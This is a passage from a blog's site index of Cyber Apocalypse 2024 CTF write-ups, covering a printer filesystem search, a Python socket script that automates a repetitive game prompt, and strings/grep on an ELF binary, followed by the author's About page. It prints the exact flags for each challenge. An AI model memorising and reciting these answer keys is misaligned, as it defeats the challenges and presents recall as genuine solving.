\u0026ldquo;AM,\u0026rdquo; a young hacker from the Phreaks, found himself falling in love with \u0026ldquo;echo,\u0026rdquo; a talented security researcher from the Revivalists. Despite the different backgrounds, you share a common goal: dismantling The Fray. You still remember the first interaction where you both independently hacked into The Fray\u0026rsquo;s systems and stumbled upon the same vulnerability in a printer. Leaving behind your hacker handles, \u0026ldquo;AM\u0026rdquo; and \u0026ldquo;echo,\u0026rdquo; you connected through IRC channels and began plotting your rebellion together. Now, it\u0026rsquo;s finally time to analyze the printer\u0026rsquo;s filesystem. What can you find?\nFlag: HTB{1n7323571n9_57uff_1n51d3_4_p21n732}\nGiven the file system to the printer. I first list out the directories of the file system to see what folders do I have. The saveDevice seems to be interesting folder and might hold some data used by the to printer documents. Hence, I started digging into the the directory. I came across this PDF file while digging through the file system and I opened it with a PDF viewer and managed to find the flag in the PDF. ![[Pasted image 20240310035535.png]]\nMisc # Stop Drop and Roll # The Fray: The Video Game is one of the greatest hits of the last\u0026hellip; well, we don\u0026rsquo;t remember quite how long. Our \u0026ldquo;computers\u0026rdquo; these days can\u0026rsquo;t run much more than that, and it has a tendency to get repetitive\u0026hellip;\nFlag: HTB{1_wiLl_sT0p_dR0p_4nD_r0Ll_mY_w4Y_oUt!}\nGiven a docker instance, I used netcat to access the docker instance and I am greeted with the prompt below. I started to type in the response with the instruction given above, however I do feel like this is going to be tough by manually inputting the response. As the description of the challenge mentioned that the program would be repetitive. Therefore, my first thought would be creating a script to automate the response.\nimport socket import time def play_game(): with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((\u0026#39;83.136.254.167\u0026#39;, 31113)) # Connect to the game server # Start the game data = s.recv(1024).decode() # Receive initial message print(data) # Print the initial message # Confirm readiness s.sendall(b\u0026#39;y\\n\u0026#39;) # Send \u0026#39;y\u0026#39; to confirm readiness time.sleep(1) # Delay before starting the confirmation # Repeat the response process until no data received. while True: data = s.recv(1024).decode() # Receive game scenario if not data: # If no data received, break the loop break print(data) # Print the game scenario scenarios = data.strip().split(\u0026#39;, \u0026#39;) # Split the scenario into individual elements print(\u0026#34;Scenarios:\u0026#34;,scenarios) response = \u0026#34;\u0026#34; # Initialize response string for scenario in scenarios: if \u0026#34;FIRE\u0026#34; in scenario: response += \u0026#34;ROLL-\u0026#34; # If scenario contains FIRE, append ROLL to response elif \u0026#34;GORGE\u0026#34; in scenario: response += \u0026#34;STOP-\u0026#34; # If scenario contains GORGE, append STOP to response elif \u0026#34;PHREAK\u0026#34; in scenario: response += \u0026#34;DROP-\u0026#34; # If scenario is PHREAK, append DROP to response response = response[:-1] # Remove the last \u0026#39;-\u0026#39; from the response print(\u0026#34;Response:\u0026#34;, response) # Print the response s.sendall(response.encode() + b\u0026#39;\\n\u0026#39;) # Send the response to the server time.sleep(1) # Delay for 1 second if __name__ == \u0026#34;__main__\u0026#34;: play_game() # Call the play_game function to start the game After few minutes of running the script I got the flag. Rev # Lootstash # A giant stash of powerful weapons and gear have been dropped into the arena - but there\u0026rsquo;s one item you have in mind. Can you filter through the stack to get to the one thing you really need?\nFlag: HTB{n33dl3_1n_a_l00t_stack}\nThe file given is an ELF file, and the description of the challenge mentioned about filter through the stack. So what I did was using strings to get the string value of the file and use grep to filter the keyword of the flag which is HTB and that is how I obtained the flag. ","date":"13 March 2024","externalUrl":null,"permalink":"/posts/cyberapocalpyse2024/","section":"Posts","summary":"This page contains Cyber Apocalypse 2024 CTF writeups, covering challenges in Crypto, Forensic, Hardware, Misc, and Rev.","title":"Cyber Apocalypse 2024 - Writeups","type":"posts"},{"content":" About Me # Hi, I\u0026rsquo;m oxygen — a Blue Teamer with a passion for DFIR and Malware Analysis. I\u0026rsquo;m driven by curiosity and a desire to protect systems from evolving threats. Whether it’s investigating incidents, analyzing malware, or fortifying defenses, I love solving complex puzzles and uncovering the truth behind cyberattacks.\nI\u0026rsquo;m a lifelong learner, always eager to expand my knowledge and sharpen my skills. While I\u0026rsquo;m still growing in the field of DFIR, I embrace every opportunity to learn and improve.\nFind me here # Twitter (X)\nDiscord - oxygen28\n","externalUrl":null,"permalink":"/about/","section":"","summary":"About Me # Hi, I\u0026rsquo;m oxygen — a Blue Teamer with a passion for DFIR and Malware Analysis.","title":"","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]